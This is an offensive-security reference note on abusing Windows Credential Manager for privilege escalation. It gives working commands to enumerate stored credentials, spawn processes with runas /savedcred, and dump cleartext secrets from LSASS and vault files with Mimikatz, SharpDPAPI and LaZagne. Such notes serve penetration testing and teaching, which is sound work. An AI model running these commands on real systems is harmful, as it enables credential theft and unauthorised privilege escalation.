---
created: 2026-09-04
updated: 2026-09-20
tags:
  - Windows
  - Windows_PrivEsc
status: complete
---
## Windows Credential Manager

> [!abstract]+ **Scope**: Windows Credential Manager architecture, Windows Vault structures (`Policy.vpol`, `.vcrd`, `.vsch`), native enumeration (`cmdkey`, `vaultcmd`), `/savedcred` process execution abuse, Mimikatz memory and vault extraction (`sekurlsa::credman`, `vault::cred`), and SharpDPAPI vault decryption.

- [ ] Enumerate active Credential Manager entries using `cmdkey /list` and `vaultcmd`.
- [ ] Inspect filesystem paths for user and system vault directories.
- [ ] Check for privileged credentials stored with `Local machine persistence`.
- [ ] Abuse saved credentials via `runas /savedcred` to spawn processes under target user contexts.
- [ ] Extract DPAPI-encrypted Credential Manager secrets live using Mimikatz `sekurlsa::credman`.
- [ ] Decrypt offline vault files (`.vcrd`) using Mimikatz `vault::cred` or `SharpDPAPI`.

---

## How Windows Credential Manager works

- **Windows Credential Manager** is a built-in Windows security subsystem that stores authentication credentials used by the operating system, applications, network shares, and web services.
- Credential Manager stores credentials for domain accounts, network shares (SMB), RDP sessions, wireless profiles, Remote Desktop connections, legacy web applications, and Windows services.
- Stored credentials reside inside encrypted storage containers known as **Windows Vaults** or **Credential Lockers**.
- Windows Vaults are stored in per-user and system-level file system directories:

| Storage Location | Context | Description |
| :--- | :--- | :--- |
| `%LOCALAPPDATA%\Microsoft\Vault\` | User Local | Per-user vault files specific to the local workstation. |
| `%APPDATA%\Microsoft\Vault\` | User Roaming | Per-user roaming vault files synchronized across domain hosts. |
| `%LOCALAPPDATA%\Microsoft\Credentials\` | User Credentials | Per-user DPAPI-encrypted credential blob files. |
| `%APPDATA%\Microsoft\Credentials\` | User Credentials | Per-user roaming DPAPI-encrypted credential files. |
| `%PROGRAMDATA%\Microsoft\Vault\` | System Vault | System-wide vault storage container. |
| `%SYSTEMROOT%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\` | SYSTEM Account | Roaming vault container for the `SYSTEM` account context. |

## Understanding vault file structures

- Each Windows Vault container resides inside a directory named after the unique GUID assigned to the vault.
- Inside a vault GUID directory, three core file types manage encryption and schema layout:
  - **`Policy.vpol` (Vault Policy File)**: Contains the AES keys (AES-128 or AES-256) used to encrypt credential entries inside `.vcrd` files. The AES keys stored inside `Policy.vpol` are encrypted using [[🛠️ DPAPI credentials]].
  - **`.vcrd` (Vault Credential Record)**: Contains individual credential records encrypted with the AES key from `Policy.vpol`.
  - **`.vsch` (Vault Schema File)**: Describes the structural schema and property attributes of credential entries inside the vault.

## Enumerating stored credentials via native CLI

- Windows provides two native command-line utilities to enumerate stored credentials without custom tooling.

### Enumerating credentials via cmdkey

- `cmdkey.exe` manages stored user credentials in Credential Manager.
- List stored credentials for the active user session:

```cmd
cmdkey /list
```

| Flag | Description |
| :--- | :--- |
| `/list` | Displays all target names, credential types, user accounts, and persistence flags. |

- Review output parameters returned by `cmdkey /list`:
  - **Target**: The network resource, server name, or application bound to the credential (e.g., `Domain:interactive=SRV01\mcharles` or `git:https://github.com`).
  - **Type**: The classification of the credential (e.g., `Domain Password`, `Generic`).
  - **User**: The username bound to the stored credential.
  - **Persistence**: Specifies credential lifespan across reboots (`Local machine persistence` indicates the secret survives system restarts).

### Enumerating vaults via vaultcmd

- `vaultcmd.exe` interacts directly with the vault subsystem instead of passing through the high-level Credential Manager API.
- List all registered vault containers on the host:

```cmd
vaultcmd /list
```

- List credential records stored inside a specific vault container:

```cmd
vaultcmd /listcreds:"Windows Credentials"
vaultcmd /listcreds:"Web Credentials"
vaultcmd /listcreds:"Windows Credentials" /all
```

- Display properties and schema information for a vault container:

```cmd
vaultcmd /listproperties:"Windows Credentials"
```

| Flag / Parameter | Value | Description |
| :--- | :--- | :--- |
| `/list` | Subcommand | Enumerates registered vault GUIDs and friendly names. |
| `/listcreds:` | `"Vault Name"` | Displays credential item GUIDs and target resource names. |
| `/all` | Toggle | Displays full credential entries instead of metadata only. |
| `/listproperties:` | `"Vault Name"` | Displays schema GUIDs, flags, and security descriptors. |

### Enumerating vault files on the filesystem

- You can inspect vault directories directly using PowerShell or Command Prompt to locate hidden `.vcrd` and `Policy.vpol` files:

```powershell
Get-ChildItem -Hidden -Recurse "$env:LOCALAPPDATA\Microsoft\Vault\"
Get-ChildItem -Hidden -Recurse "$env:APPDATA\Microsoft\Credentials\"
Get-ChildItem -Hidden -Recurse "$env:ProgramData\Microsoft\Vault\" 2>$null
```

## Exploiting saved credentials via runas /savedcred

- `runas.exe` allows a user to execute binaries under a different user security context.
- The `/savedcred` flag instructs `runas.exe` to use stored credentials previously cached in Credential Manager by that user.
- Execute a process under a target user account using stored credentials:

```cmd
runas /savedcred /user:SRV01\mcharles "cmd.exe /k whoami"
```

| Flag / Parameter | Value | Description |
| :--- | :--- | :--- |
| `/savedcred` | Toggle | Directs `runas.exe` to read the target user's password from Credential Manager automatically. |
| `/user:` | `SRV01\mcharles` | Target domain or local user account. |
| `"cmd.exe /k whoami"` | Command | Binary path or shell command to execute under target user privileges. |

> [!important]+ **Prerequisite**:
> - `/savedcred` works only if a credential for the specified `/user:` account is already present in Credential Manager with `Local machine persistence`.
> - You don't need to know the target user's plain-text password if `cmdkey /list` confirms an existing entry.

> [!tip]+ **Verification**: Verify successful execution by checking the output process token:
> ```cmd
> runas /savedcred /user:SRV01\mcharles "whoami /all"
> ```

## Extracting credentials using Mimikatz

- Mimikatz extracts cleartext passwords and NTLM hashes from Credential Manager memory structures or decrypts vault files on disk.

### Extracting live credentials via sekurlsa::credman

- When running under an elevated shell with `SeDebugPrivilege`, Mimikatz reads active session credentials from LSASS memory:

```powershell
mimikatz.exe "privilege::debug" "sekurlsa::credman" exit
```

| Module | Command | Description |
| :--- | :--- | :--- |
| `privilege` | `debug` | Obtains `SeDebugPrivilege` for LSASS memory handle access. |
| `sekurlsa` | `credman` | Scans LSASS memory structures for Credential Manager entries and outputs cleartext passwords. |

### Decrypting vault containers via vault module

- Mimikatz reads vault files directly from disk and uses DPAPI to unwrap `Policy.vpol` keys:
- List available vaults and credential records:

```powershell
mimikatz.exe "privilege::debug" "vault::list" exit
```

- Decrypt and display cleartext vault credentials:

```powershell
mimikatz.exe "privilege::debug" "vault::cred" exit
```

| Module | Command | Description |
| :--- | :--- | :--- |
| `vault` | `list` | Enumerates vault GUID containers, schema types, and record headers. |
| `vault` | `cred` | Decrypts `Policy.vpol` and `.vcrd` files to output plain-text credentials. |

## Extracting credentials using SharpDPAPI

- `SharpDPAPI` automates DPAPI master key retrieval and vault decryption across user profiles.
- Triage vault contents without decryption:

```powershell
.\SharpDPAPI.exe vault /triage
```

- Decrypt user vault credentials using current user context:

```powershell
.\SharpDPAPI.exe vault
```

- Decrypt credentials from an offline vault directory using an explicit master key:

```powershell
.\SharpDPAPI.exe vault /vault:"C:\Users\jdoe\AppData\Local\Microsoft\Vault\<GUID>" /masterkey:<64_byte_masterkey>
```

| Flag / Parameter | Value | Description |
| :--- | :--- | :--- |
| `vault` | Subcommand | Parses Windows Vault structures. |
| `/triage` | Toggle | Outputs non-decrypted metadata for discovered vaults. |
| `/vault:` | Path | Path to target vault GUID directory. |
| `/masterkey:` | Key String | 64-byte DPAPI master key used for offline decryption. |

## Extracting credentials using LaZagne

- `LaZagne` extracts Credential Manager entries alongside browser, mail, database, and Wi-Fi secrets without manual vault parsing:

```powershell
lazagne.exe credman
```

> [!note] See [[🛠️ Windows credential hunting#LaZagne]] for full `LaZagne` module coverage (`browsers`, `windows`, `wifi`, `sysadmin`).

## References and further reading

- [`Windows Credential Manager — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/credentials/dumping/windows-credential-manager)
- [`Credentials from Password Stores: Windows Credential Manager — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1555/004/)
- [`SharpDPAPI — GitHub`](https://github.com/GhostPack/SharpDPAPI)